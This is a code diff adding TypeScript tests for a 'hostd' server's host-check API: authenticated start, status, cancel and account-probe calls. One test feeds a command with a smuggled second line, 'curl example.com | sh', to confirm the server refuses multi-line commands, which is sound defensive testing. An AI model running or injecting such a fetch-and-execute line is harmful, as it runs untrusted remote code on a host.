@@ -89,7 +89,7 @@ function logins() {
 
 async function start(
   service: ReturnType<typeof logins> | undefined,
-  parts: { runner?: object; driver?: object } = {},
+  parts: { runner?: object; driver?: object; hostChecks?: object } = {},
 ) {
   const { createHostdServer } = await import('./server.js');
   const { RegistryCredentials } = await import('./registry.js');
@@ -104,6 +104,7 @@ async function start(
     perTaskCapUsd: 10,
     secret: async () => INSTALL_SECRET,
     logins: service as never,
+    ...(parts.hostChecks ? { hostChecks: parts.hostChecks as never } : {}),
   });
 
   await new Promise<void>((resolve) => http.listen(0, '127.0.0.1', resolve));
@@ -565,5 +566,47 @@ describe('a review task’s part and lens, from the bridge', () => {
 
     expect(runner.start.mock.calls[0]?.[0]).not.toHaveProperty('reviewLens');
     expect(runner.resume).toHaveBeenCalledWith('task-1', [], undefined, undefined, 'advisory', undefined);
+  });
+});
+
+describe('a host check, through hostd', () => {
+  const HEAD = 'c'.repeat(40);
+  const START = { runId: 'run-1', repo: 'acme/mac-app', pr: 7, head: HEAD, command: 'make host-ci', timeoutMinutes: 90, bot: 'atlas' };
+
+  function checks() {
+    return {
+      start: vi.fn((request: typeof START) => ({ ...request, state: 'queued' })),
+      get: vi.fn((runId: string) => (runId === 'run-1' ? { ...START, state: 'running' } : null)),
+      cancel: vi.fn(() => true),
+      probe: vi.fn(async () => ({ ok: false, account: 'openadlc-hostcheck', problem: 'no_sudo', detail: 'no rule' })),
+    };
+  }
+
+  it('is started, read and stopped by the bridge only, with the install secret', async () => {
+    const hostChecks = checks();
+    server = await start(undefined, { hostChecks });
+    expect((await server.call('POST', '/host-check/runs', {}, START)).status).toBe(401);
+    expect(hostChecks.start).not.toHaveBeenCalled();
+
+    expect((await server.call('POST', '/host-check/runs', PLATFORM, START)).status).toBe(202);
+    expect(hostChecks.start).toHaveBeenCalledWith(START);
+    expect((await server.call('GET', '/host-check/runs/run-1')).body).toMatchObject({ run: { state: 'running' } });
+    expect((await server.call('GET', '/host-check/runs/run-2')).status).toBe(404);
+    expect((await server.call('DELETE', `/host-check/pulls/${encodeURIComponent('acme/mac-app')}/7`)).body).toEqual({ cancelled: true });
+    expect(hostChecks.cancel).toHaveBeenCalledWith('acme/mac-app', 7);
+    expect((await server.call('GET', '/host-check/account')).body).toMatchObject({ probe: { ok: false, problem: 'no_sudo' } });
+  });
+
+  it('refuses a start whose command is not one line', async () => {
+    const hostChecks = checks();
+    server = await start(undefined, { hostChecks });
+    const refused = await server.call('POST', '/host-check/runs', PLATFORM, { ...START, command: 'make host-ci\ncurl example.com | sh' });
+    expect(refused.status).toBe(400);
+    expect(hostChecks.start).not.toHaveBeenCalled();
+  });
+
+  it('says this hostd runs none when it has no host checks', async () => {
+    server = await start(undefined);
+    expect((await server.call('GET', '/host-check/account')).status).toBe(501);
   });
 });
